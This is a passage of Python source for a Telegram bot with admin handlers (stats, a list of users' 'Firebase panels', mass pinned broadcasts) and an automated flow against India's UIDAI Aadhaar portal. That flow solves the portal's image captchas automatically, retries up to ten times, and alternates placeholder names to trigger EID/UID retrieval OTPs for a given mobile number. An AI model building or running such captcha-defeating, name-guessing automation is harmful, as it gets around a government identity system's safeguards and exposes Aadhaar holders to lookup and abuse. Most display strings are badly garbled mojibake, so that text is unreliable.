                f"<b>Ã¢Â­Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {'ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â' if s['is_banned'] else 'Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â'}</b>\n"
                f"<b>Ã¢ÂÂ Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´Â: {'ÃÂÃ¡Â´Âs' if s['verified'] else 'ÃÂ´Ã¡Â´Â'}</b>\n"
                "</blockquote>"
            )
            await update.message.reply_text(text=msg, parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("Ã¢ÂÂ Invalid ID")

    async def admin_daily_stats(self, update, ctx):
        uid = update.effective_user.id
        if not is_admin(uid):
            return
        stats = list(daily_stats_col.find().sort('date', -1).limit(10))
        if not stats:
            await update.message.reply_text("No stats")
            return
        msg = f"<b>Ã°ÂÂÂ ÃÂÃ¡Â´ÂsÃ¡Â´Â 10 Ã¡Â´ÂÃ¡Â´ÂÃÂs</b>\n\n"
        for s in stats:
            msg += f"<b>{s.get('date')}: {s.get('total_downloads',0)} dl, {s.get('unique_users',0)} u</b>\n"
        await update.message.reply_text(text=msg, parse_mode='HTML')

    async def admin_firebases_cmd(self, update, ctx):
        await self.admin_list_firebases(update, ctx, page=0)

    async def admin_list_firebases(self, update, ctx, page: int = 0):
        uid = update.effective_user.id
        if not is_admin(uid):
            if update.callback_query:
                await update.callback_query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
            else:
                await update.message.reply_text("Ã¢ÂÂ You are not authorized.")
            return

        all_fbs = await asyncio.to_thread(get_all_firebases, None)

        if not all_fbs:
            text = (
                f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃÂÃÂ ÃÂÃ¡Â´ÂÃÂ¢ÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Âs</b>\n\n"
                "<blockquote>"
                "<b>Abhi tak kisi bhi user ne koi Firebase panel add nahi kiya hai.</b>"
                "</blockquote>"
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("ADMIN MENU", callback_data='admin_back_menu', style="primary")]
            ])
            if update.callback_query:
                await update.callback_query.answer()
                try:
                    await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode='HTML')
                except Exception:
                    await update.callback_query.message.reply_text(text, reply_markup=kb, parse_mode='HTML')
            else:
                await update.message.reply_text(text, reply_markup=kb, parse_mode='HTML')
            return

        per_page = 5
        total_items = len(all_fbs)
        total_pages = max(1, (total_items + per_page - 1) // per_page)
        page = max(0, min(page, total_pages - 1))

        start_idx = page * per_page
        end_idx = min(start_idx + per_page, total_items)
        page_items = all_fbs[start_idx:end_idx]

        # Unique users count
        unique_users = len(set(fb.get('user_id') for fb in all_fbs if fb.get('user_id')))

        # Fetch user info for items on this page
        uids_on_page = list(set(fb.get('user_id') for fb in page_items if fb.get('user_id')))
        users_info = {}
        if uids_on_page:
            try:
                found_users = await asyncio.to_thread(lambda: list(users_col.find({'user_id': {'$in': uids_on_page}})))
                for u in found_users:
                    users_info[u['user_id']] = u
            except Exception as e:
                logger.error(f"Error fetching users for firebases: {e}")

        text = (
            f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃÂÃÂ ÃÂÃ¡Â´ÂÃÂ¢ÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Âs ({page+1}/{total_pages})</b>\n\n"
            f"<b>{emo('Ã°ÂÂÂ')} Total Panels:</b> <code>{total_items}</code> | <b>{emo('Ã°ÂÂÂ¤')} Users:</b> <code>{unique_users}</code>\n\n"
        )

        for i, fb in enumerate(page_items, start=start_idx + 1):
            fb_uid = fb.get('user_id')
            user_doc = users_info.get(fb_uid)
            if user_doc:
                name_parts = [user_doc.get('first_name', ''), user_doc.get('last_name', '')]
                full_name = ' '.join(p for p in name_parts if p).strip() or 'Unknown'
                uname = f"@{user_doc['username']}" if user_doc.get('username') else "No Username"
            else:
                full_name = "Unknown"
                uname = "No Username"

            created = fb.get('created_at', 'N/A')
            if created and 'T' in str(created):
                try:
                    dt = datetime.fromisoformat(str(created))
                    created_str = dt.strftime("%d-%m-%Y %I:%M %p")
                except Exception:
                    created_str = str(created)[:16]
            else:
                created_str = str(created)

            text += (
                f"<b>[{i}] {emo('Ã°ÂÂÂ¥')} {html.escape(fb.get('name', 'Firebase'))}</b>\n"
                "<blockquote>"
                f"<b>{emo('Ã°ÂÂÂ¤')} User:</b> {html.escape(full_name)} ({uname})\n"
                f"<b>{emo('Ã°ÂÂÂ')} User ID:</b> <code>{fb_uid}</code>\n"
                f"<b>{emo('Ã°ÂÂÂ')} URL:</b> <code>{html.escape(fb.get('url', 'N/A'))}</code>\n"
                f"<b>{emo('Ã°ÂÂÂ')} Date:</b> <code>{created_str}</code>"
                "</blockquote>\n"
            )

        kb_buttons = []

        # Delete buttons row for items on current page
        del_row = []
        for i, fb in enumerate(page_items, start=start_idx + 1):
            del_row.append(InlineKeyboardButton(
                f"[{i}]",
                callback_data=f"admin_delfb_{fb['id']}_{page}",
                style="danger"
            ))
            if len(del_row) == 3:
                kb_buttons.append(del_row)
                del_row = []
        if del_row:
            kb_buttons.append(del_row)

        # Pagination row
        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton("Ã¢Â¬ÂÃ¯Â¸Â Prev", callback_data=f"admin_firebases_{page-1}"))
        nav_row.append(InlineKeyboardButton(f"Ã°ÂÂÂ {page+1}/{total_pages}", callback_data="noop"))
        if page < total_pages - 1:
            nav_row.append(InlineKeyboardButton("Next Ã¢ÂÂ¡Ã¯Â¸Â", callback_data=f"admin_firebases_{page+1}"))
        if nav_row:
            kb_buttons.append(nav_row)

        # Back button
        kb_buttons.append([
            InlineKeyboardButton("ADMIN MENU", callback_data='admin_back_menu', style="primary")
        ])

        reply_markup = InlineKeyboardMarkup(kb_buttons)

        if update.callback_query:
            try:
                await update.callback_query.answer()
            except Exception:
                pass
            try:
                await update.callback_query.edit_message_text(
                    text=text, reply_markup=reply_markup, parse_mode='HTML'
                )
            except Exception:
                try:
                    await update.callback_query.edit_message_caption(
                        caption=text, reply_markup=reply_markup, parse_mode='HTML'
                    )
                except Exception:
                    await update.callback_query.message.reply_text(
                        text=text, reply_markup=reply_markup, parse_mode='HTML'
                    )
        else:
            await update.message.reply_text(
                text=text, reply_markup=reply_markup, parse_mode='HTML'
            )

    async def admin_broadcast(self, update, ctx, pin_mode=False):
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("Ã¢ÂÂ You are not authorized to use this command.")
            return

        self.update_user_data(uid, 'broadcast_pin', pin_mode)
        mode_title = f"{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃÂ´ ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â" if pin_mode else f"{emo('Ã°ÂÂÂ¢')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â"
        pin_note = "\n<b>Ã°ÂÂÂ NOTE: This broadcast will be automatically PINNED in all users' chats!</b>\n" if pin_mode else ""
        cmd_name = "/pin_broadcast" if pin_mode else "/broadcast"

        if ctx.args:
            message = ' '.join(ctx.args)
            self.update_user_data(uid, 'broadcast_text', message)
            self.update_user_data(uid, 'broadcast_msg_id', None)
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Ã¢ÂÂ YES, SEND BROADCAST", callback_data='broadcast_confirm_text'),
                 InlineKeyboardButton("Ã¢ÂÂ CANCEL", callback_data='broadcast_cancel')]
            ])
            total = get_all_users_count()
            await update.message.reply_text(
                f"<b>{mode_title} Ã¡Â´ÂÃ¡Â´ÂÃÂ´ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>\n\n"
                f"<b>Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â:</b>\n{message}\n\n"
                f"<b>{emo('Ã°ÂÂÂ¤')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´Âs: {total}</b>{pin_note}\n"
                "<b>Ã°ÂÂÂ¡ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂª Ã¡Â´ÂÃÂªÃ¡Â´Â:</b>\n"
                f"<i>Telegram Premium custom emojis ke sath broadcast karne ke liye sirf <code>{cmd_name}</code> send karein aur fir apna message bhejein!</i>",
                reply_markup=kb, parse_mode='HTML')
        else:
            self.update_user_data(uid, 'awaiting_broadcast', True)
            await update.message.reply_text(
                f"<b>{mode_title} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â</b>\n\n"
                "<blockquote>"
                f"<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â (Ã¡Â´ÂÃ¡Â´ÂxÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs, Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â, Ã¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â, sÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ, Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.) ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â.</b>{pin_note}\n\n"
                "<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs Ã¡Â´Â¡ÃÂªÃÂÃÂ ÃÂÃ¡Â´Â 100% Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs Ã¡Â´Â ÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ_Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â!</b>"
                "</blockquote>\n\n"
                "<b>sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ.</b>",
                parse_mode='HTML')

    async def admin_pin_broadcast(self, update, ctx):
        await self.admin_broadcast(update, ctx, pin_mode=True)


    async def admin_maintenance(self, update, ctx):
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("Ã¢ÂÂ You are not authorized to use this command.")
            return
        if ctx.args:
            arg = ctx.args[0].lower()
            if arg in ['on', 'enable', '1']:
                set_maintenance_mode(True)
                msg = f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â (Ã°ÂÂÂ´ ON)</b>"
            elif arg in ['off', 'disable', '0']:
                set_maintenance_mode(False)
                msg = f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂªsÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â (Ã°ÂÂÂ¢ OFF)</b>"
            else:
                msg = f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂsÃ¡Â´ÂÃÂ¢Ã¡Â´Â: /maintenance [on/off]</b>"
        else:
            cur = is_maintenance_mode()
            new_status = not cur
            set_maintenance_mode(new_status)
            status_str = "Ã°ÂÂÂ´ ON" if new_status else "Ã°ÂÂÂ¢ OFF"
            msg = f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â is now {status_str}</b>"
        await update.message.reply_text(msg, parse_mode='HTML')

    async def handle_broadcast_confirm(self, update, ctx):
        query = update.callback_query
        await query.answer()
        uid = update.effective_user.id
        if not is_admin(uid):
            return
        if query.data == 'broadcast_cancel':
            self.update_user_data(uid, 'awaiting_broadcast', False)
            try:
                await query.message.delete()
            except Exception:
                pass
            await query.message.reply_text("Ã¢ÂÂ Cancelled")
            return

        data = self.get_user_data(uid)
        msg_id = data.get('broadcast_msg_id')
        chat_id = data.get('broadcast_chat_id')
        text = data.get('broadcast_text')
        pin_mode = data.get('broadcast_pin', False)
        users = get_all_users()
        total_users = len(users)

        mode_prefix = f"{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃÂ´ " if pin_mode else ""
        prog = await query.message.reply_text(
            f"<b>{emo('Ã¢ÂÂ¡')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>\n\n"
            f"<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ')} Progress:</b> [Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ] 0.0%\n"
            f"<b>{emo('Ã°ÂÂÂ¥')} Processed:</b> 0/{total_users} (Ã¢ÂÂ 0 | Ã¢ÂÂ 0)\n"
            f"<b>{emo('Ã°ÂÂÂ')} Status:</b> <i>Dispatching messages...</i>"
            f"</blockquote>",
            parse_mode='HTML')

        async def run():
            ok_count = 0
            fail_count = 0
            processed_count = 0
            active = True
            update_lock = asyncio.Lock()
            last_edit_time = 0.0

            def render_bar(current, total, length=10):
                if total <= 0:
                    return "Ã¢ÂÂ" * length, 0.0
                pct = min(1.0, current / total)
                filled = int(round(length * pct))
                bar = "Ã¢ÂÂ" * filled + "Ã¢ÂÂ" * (length - filled)
                return bar, pct * 100.0

            async def send_to_user(target_uid):
                nonlocal ok_count, fail_count, processed_count
                max_retries = 3
                sent = False

                for attempt in range(1, max_retries + 1):
                    try:
                        sent_item = None
                        if msg_id and chat_id:
                            try:
                                sent_item = await ctx.bot.copy_message(
                                    chat_id=target_uid,
                                    from_chat_id=chat_id,
                                    message_id=msg_id
                                )
                            except Exception:
                                sent_item = await ctx.bot.forward_message(
                                    chat_id=target_uid,
                                    from_chat_id=chat_id,
                                    message_id=msg_id
                                )
                        elif text:
                            sent_item = await ctx.bot.send_message(
                                chat_id=target_uid,
                                text=f"<b>{emo('Ã°ÂÂÂ¢')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´</b>\n\n{text}",
                                parse_mode='HTML'
                            )

                        if sent_item:
                            if pin_mode:
                                try:
                                    await ctx.bot.pin_chat_message(
                                        chat_id=target_uid,
                                        message_id=sent_item.message_id,
                                        disable_notification=True
                                    )
                                except Exception as pin_err:
                                    logger.debug(f"Could not pin broadcast in chat {target_uid}: {pin_err}")
                            sent = True
                            break

                    except tg_err.RetryAfter as ra:
                        wait_sec = ra.retry_after or 1.0
                        logger.warning(f"Flood control for {target_uid}: sleeping {wait_sec}s")
                        await asyncio.sleep(wait_sec + 0.5)
                    except (tg_err.NetworkError, tg_err.TimedOut) as net_err:
                        logger.warning(f"Network error sending to {target_uid} (attempt {attempt}): {net_err}")
                        await asyncio.sleep(1.0 * attempt)
                    except tg_err.Forbidden:
                        logger.info(f"User {target_uid} blocked bot or deleted account.")
                        break
                    except Exception as e:
                        logger.warning(f"Broadcast error for {target_uid} (attempt {attempt}): {e}")
                        await asyncio.sleep(0.5 * attempt)

                async with update_lock:
                    processed_count += 1
                    if sent:
                        ok_count += 1
                    else:
                        fail_count += 1

            async def progress_reporter():
                nonlocal last_edit_time
                while active:
                    await asyncio.sleep(1.5)
                    async with update_lock:
                        cur = processed_count
                        ok = ok_count
                        fail = fail_count

                    bar, pct = render_bar(cur, total_users)
                    status_text = (
                        f"<b>{emo('Ã¢ÂÂ¡')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â ÃÂªÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´Âss...</b>\n\n"
                        f"<blockquote>"
                        f"<b>{emo('Ã°ÂÂÂ')} Progress:</b> [{bar}] {pct:.1f}%\n"
                        f"<b>{emo('Ã°ÂÂÂ¥')} Processed:</b> {cur}/{total_users} (Ã¢ÂÂ {ok} | Ã¢ÂÂ {fail})\n"
                        f"<b>{emo('Ã¢ÂÂ³')} Status:</b> <i>Sending at high speed...</i>"
                        f"</blockquote>"
                    )
                    now = time.time()
                    if now - last_edit_time >= 1.5:
                        try:
                            await prog.edit_text(status_text, parse_mode='HTML')
                            last_edit_time = now
                        except Exception:
                            pass

            reporter_task = asyncio.create_task(progress_reporter())

            sem = asyncio.Semaphore(25)
            async def bounded_worker(target_uid):
                async with sem:
                    await send_to_user(target_uid)
                    await asyncio.sleep(0.04)

            try:
                await asyncio.gather(*(bounded_worker(t) for t in users), return_exceptions=True)
            finally:
                active = False
                try:
                    await reporter_task
                except Exception:
                    pass

            save_broadcast(text or f"Telegram {'Pin ' if pin_mode else ''}Message Broadcast", ok_count)
            self.update_user_data(uid, 'broadcast_msg_id', None)
            self.update_user_data(uid, 'broadcast_chat_id', None)
            self.update_user_data(uid, 'broadcast_text', None)
            self.update_user_data(uid, 'broadcast_pin', False)

            bar, _ = render_bar(total_users, total_users)
            try:
                await prog.edit_text(
                    f"<b>{emo('Ã°ÂÂÂ')} {mode_prefix}ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
                    f"<blockquote>"
                    f"<b>{emo('Ã°ÂÂÂ')} Progress:</b> [{bar}] 100.0%\n"
                    f"<b>{emo('Ã°ÂÂÂ¥')} Total Users:</b> <code>{total_users}</code>\n"
                    f"<b>{emo('Ã¢ÂÂ')} Successfully Sent:</b> <code>{ok_count}</code>\n"
                    f"<b>{emo('Ã¢ÂÂ')} Failed (Blocked/Deleted):</b> <code>{fail_count}</code>"
                    f"</blockquote>",
                    parse_mode='HTML')
            except Exception:
                pass

        asyncio.create_task(run())

    # ==========================================
    # UIDAI CAPTCHA (AUTO 5x)
    # ==========================================
    # ==========================================
    # UIDAI CAPTCHA (AUTO 5x)
    # ==========================================
    async def _uidai_captcha_auto_retry(self, update, ctx, txn_key,
                                          app_id="MYAADHAAR", max_retries=5):
        user_id = update.effective_user.id
        for attempt in range(1, max_retries + 1):
            try:
                cap = await self.uidai_post(
                    f"{UIDAI_BASE}/audioCaptchaService/api/captcha/v3/generation",
                    headers=_uidai_h(app_id),
                    json_data={"captchaLength": "6", "captchaType": "2",
                               "audioCaptchaRequired": False},
                    user_id=user_id,
                    timeout=8,
                )
            except Exception as e:
                logger.warning(f"captcha fetch {attempt}: {e}")
                await asyncio.sleep(0.2)
                continue

            img_b64 = cap.get("imageBase64")
            txn_id = cap.get("transactionId")
            if not img_b64 or not txn_id:
                await asyncio.sleep(0.2)
                continue

            img_bytes = base64.b64decode(img_b64)
            solved = await asyncio.to_thread(solve_captcha_auto, img_bytes)

            if solved and len(solved) == 6:
                logger.info(f"[auto] solved attempt {attempt}: {solved}")
                self.update_user_data(user_id, txn_key, txn_id)
                return txn_id, solved

            logger.info(f"[auto] attempt {attempt}/{max_retries} failed")
            await asyncio.sleep(0.2)

        await update.message.reply_text(
            f"Ã¢ÂÂ Auto-captcha failed after {max_retries} tries.\n/start again."
        )
        return None, None

    # ==========================================
    # PHASE 1 Ã¢ÂÂ Mobile Ã¢ÂÂ EID
    # ==========================================
    async def _uidai_start_flow(self, update, ctx, mobile, name="Mr", dob=None, max_retries=10):
        user_id = update.effective_user.id

        self.update_user_data(user_id, 'mobile', mobile)
        self.update_user_data(user_id, 'uidai_name', name or "Mr")
        self.update_user_data(user_id, 'uidai_dob', dob)
        self.update_user_data(user_id, 'uidai_retry1', 0)
        self.update_user_data(user_id, 'created_at', time.time())

        eff_msg = update.effective_message or (update.callback_query.message if update.callback_query else None)
        prog = await eff_msg.reply_text(
            f"<b>{emo('Ã¢ÂÂ³')} ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢ÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â 1...</b>",
            parse_mode='HTML')
        timeout = aiohttp.ClientTimeout(total=8, connect=3.5)
        last_err = "Unknown"
        resp = None

        for attempt in range(1, max_retries + 1):
            resp = None
            try:
                if attempt > 1:
                    asyncio.create_task(
                        safe_edit_text(
                            prog,
                            f"<b>{emo('Ã¢ÂÂ³')} ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢ÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â 1... ({attempt}/{max_retries})</b>",
                            parse_mode='HTML'
                        )
                    )

                # Step 1 & 2: Fetch and solve captcha fast
                cap = await self.uidai_post(
                    f"{UIDAI_BASE}/audioCaptchaService/api/captcha/v3/generation",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data={"captchaLength": "6", "captchaType": "2",
                               "audioCaptchaRequired": False},
                    user_id=user_id,
                    timeout=4,
                )
                img_b64 = cap.get("imageBase64")
                txn_id = cap.get("transactionId")
                if not (img_b64 and txn_id):
                    continue

                img_bytes = base64.b64decode(img_b64)
                solved = await asyncio.to_thread(solve_captcha_auto, img_bytes)
                if not solved or len(solved) != 6:
                    continue

                logger.info(f"[EID OTP1] attempt {attempt}: solved captcha {solved}")
                self.update_user_data(user_id, 'uidai_cap1_txn', txn_id)
                self.update_user_data(user_id, 'uidai_cap1_value', solved)

                # Step 3: Send OTP request
                name_val = name if (name and name != "Mr") else ("Mr" if attempt % 2 != 0 else "A")
                payload = {
                    "mobileNumber": mobile,
                    "dob": dob,
                    "email": None,
                    "name": name_val,
                    "option": "EID",
                    "otp": None,
                    "otpTxnId": None,
                    "captchaTxnId": txn_id,
                    "captcha": solved,
                    "resendOtp": False,
                }
                resp = await self.uidai_post(
                    f"{UIDAI_BASE}/retrieveEidUid/ext/v1/generic/retrieveuideid",
                    headers=_uidai_h("MYAADHAAR"),
                    json_data=payload,
                    user_id=user_id,
                    timeout=8,
                )

                rd = resp.get("responseData", {})
                if rd.get("otpSent") and rd.get("otpTxnId"):
                    safe_delete_bg(prog)

                    self.update_user_data(user_id, 'uidai_otp1_txn', rd["otpTxnId"])
                    self.update_user_data(user_id, 'stage', 'otp1')

                    otp_txn = rd.get("otpTxnId") or resp.get("txnId") or txn_id
                    bot = getattr(ctx, "bot", None) or update.get_bot()
                    await send_rich_step1_message(
                        bot,
                        update.effective_chat.id,
                        txn_id=otp_txn,
                        mobile=mobile,
                        reply_to_message_id=getattr(eff_msg, "message_id", None)
                    )
                    return True

                last_err = rd.get("message") or (resp.get("errorDetails") or {}).get("messageEnglish") or resp.get("message") or "Unknown"
                logger.warning(f"[EID OTP1] attempt {attempt} UIDAI response error: {last_err}")

                # Definitive or soft not-found from UIDAI Ã¢ÂÂ bail immediately, no 10x retry
                if is_not_linked_error(last_err) or is_soft_not_found_error(last_err):
                    try:
                        await prog.delete()
                    except Exception:
                        pass
                    await eff_msg.reply_text(get_not_linked_msg(), parse_mode='HTML')
                    self.clear_user_data(user_id)
                    return False

            except Exception as e:
                # Network/proxy/timeout error Ã¢ÂÂ retry
                last_err = str(e)
                logger.warning(f"[EID OTP1] attempt {attempt} network error: {e}")

            is_server_500 = isinstance(resp, dict) and resp.get("status_code") == 500
            if "technical difficulties" in str(last_err).lower() or is_server_500:
                await asyncio.sleep(0.4)
            else:
                await asyncio.sleep(0.05)

        try:
            await prog.delete()
        except Exception:
            pass

        # All retries exhausted
        if is_not_linked_error(last_err) or is_soft_not_found_error(last_err):
            await eff_msg.reply_text(get_not_linked_msg(), parse_mode='HTML')
        elif "technical difficulties" in str(last_err).lower():
            await eff_msg.reply_text(
                f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂª sÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ´ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªssÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
                "<blockquote>"
                "<b>UIDAI portal par abhi temporary technical difficulty chal rahi hai.</b>\n\n"
                "<b>Ã°ÂÂÂ¡ Solution:</b>\n"
                "Ã¢ÂÂ¢ Agar is number par multiple Aadhaar link hain, to is format me bhejein:\n"
                "  <code>Mobile|Name</code> (jaise: <code>9876543210|Rahul</code>)\n"
                "Ã¢ÂÂ¢ Ya 1-2 minute baad dobara <b>/start</b> karke try karein."
                "</blockquote>",
                parse_mode='HTML'
            )
        elif "captcha" in str(last_err).lower():
            await eff_msg.reply_text(
                f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
                "<blockquote>"
                "<b>Captcha verification me issue aaya. Kripya /start se dobara number bhejein.</b>"
                "</blockquote>",
                parse_mode='HTML'
            )
        else:
            err_clean = html.escape(str(last_err))
            await eff_msg.reply_text(
                f"<b>Ã¢ÂÂ Server error after {max_retries} tries:</b> <code>{html.escape(str(err_clean))}</code>\n/start se dobara.",
                parse_mode='HTML'
            )
        self.clear_user_data(user_id)
        return False


    async def _uidai_verify_otp1(self, update, ctx, otp):
        user_id = update.effective_user.id
